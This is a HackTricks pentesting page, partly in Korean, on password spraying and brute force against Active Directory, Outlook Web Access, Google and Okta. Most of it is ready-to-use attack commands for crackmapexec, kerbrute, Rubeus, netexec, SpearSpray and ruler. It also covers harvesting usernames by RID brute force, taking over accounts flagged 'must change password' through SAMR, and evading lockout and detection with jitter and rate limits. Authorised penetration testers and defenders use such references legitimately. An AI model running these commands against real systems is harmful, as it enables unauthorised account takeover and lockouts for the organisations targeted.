# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

몇 개의 **valid usernames**를 찾았다면 발견한 각 사용자에 대해 가장 흔한 **common passwords**를 시도해 볼 수 있습니다 (환경의 password policy를 염두에 두세요).\
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

주의: 여러 번의 잘못된 시도로 인해 **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### password policy 가져오기

user credentials가 있거나 domain user로서 shell이 있는 경우 다음과 같이 **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation from Linux (또는 모두)

- **crackmapexec** 사용:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) 사용 (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(차단을 피하기 위해 시도 횟수를 지정할 수 있습니다):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) 사용 - 권장하지 않음. 때때로 작동하지 않음
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**의 `scanner/smb/smb_login` 모듈을 사용:

![](<../../images/image (745).png>)

- **rpcclient** 사용:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows에서

- brute module 포함 버전의 [Rubeus](https://github.com/Zer1t0/Rubeus) 사용:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)을 사용하면 (기본적으로 도메인에서 사용자 계정을 생성하고 도메인에서 비밀번호 정책을 가져와 그에 따라 시도 횟수를 제한합니다):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- 다음과 함께 [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" 계정 식별 및 탈취 (SAMR)

저소음 기법은 무해하거나 빈 비밀번호로 spray를 시도하여 STATUS_PASSWORD_MUST_CHANGE를 반환하는 계정을 포착하는 것이다. 이는 비밀번호가 강제로 만료되어 기존 비밀번호를 알지 못해도 변경할 수 있음을 나타낸다.

워크플로우:
- 대상 목록을 만들기 위해 Enumerate users (RID brute via SAMR)을 수행:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password을 사용하고 hits 발생 시 계속 진행하여 next logon 시 변경해야 하는 계정을 캡처하세요:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 각 히트마다 SAMR을 통해 NetExec’s module로 비밀번호를 변경하세요("must change"가 설정된 경우 이전 비밀번호가 필요 없음):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
운영 노트:
- Kerberos 기반 작업 전에 호스트 시계가 DC와 동기화되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`.
- 일부 모듈(예: RDP/WinRM)에서 (Pwn3d!) 없이 [+]가 표시되면 creds는 유효하지만 계정에 대화형 로그온 권한이 없습니다.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying은 SMB/NTLM/LDAP bind 시도에 비해 노이즈를 줄이고 AD lockout 정책과 더 잘 맞습니다. SpearSpray는 LDAP-driven 타겟팅, 패턴 엔진, 그리고 정책 인식(domain policy + PSOs + badPwdCount buffer)을 결합해 정밀하고 안전하게 spray합니다. 또한 Neo4j에 compromised principals를 태그하여 BloodHound 경로 분석에 사용할 수 있습니다.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
타겟팅 및 패턴 제어:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
은밀성 및 안전 제어:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 정보 보강:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
패턴 시스템 개요 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
사용 가능한 변수:
- {name}, {samaccountname}
- 각 사용자의 pwdLastSet(또는 whenCreated)에서 파생되는 시간 값: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- 조합 도우미 및 조직 토큰: {separator}, {suffix}, {extra}

운영 참고:
- 가장 신뢰할 수 있는 badPwdCount 및 정책 관련 정보를 읽기 위해 -dc로 PDC-emulator를 조회하는 것을 권장합니다.
- badPwdCount 리셋은 관찰 창 이후 다음 시도에서 트리거됩니다; 안전을 유지하려면 임계값과 타이밍을 사용하세요.
- Kerberos pre-auth 시도는 DC 텔레메트리에서 4768/4771로 나타납니다; 섞이기 위해 jitter와 rate-limiting을 사용하세요.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook**을 위한 도구가 여러 개 있습니다.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) 사용
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) 사용
- [Ruler](https://github.com/sensepost/ruler) 사용 (신뢰할 만함!)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 사용 (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) 사용 (Powershell)

이 도구들을 사용하려면 사용자 목록과 시도할 password 또는 소수의 password 목록이 필요합니다.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 참고자료

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
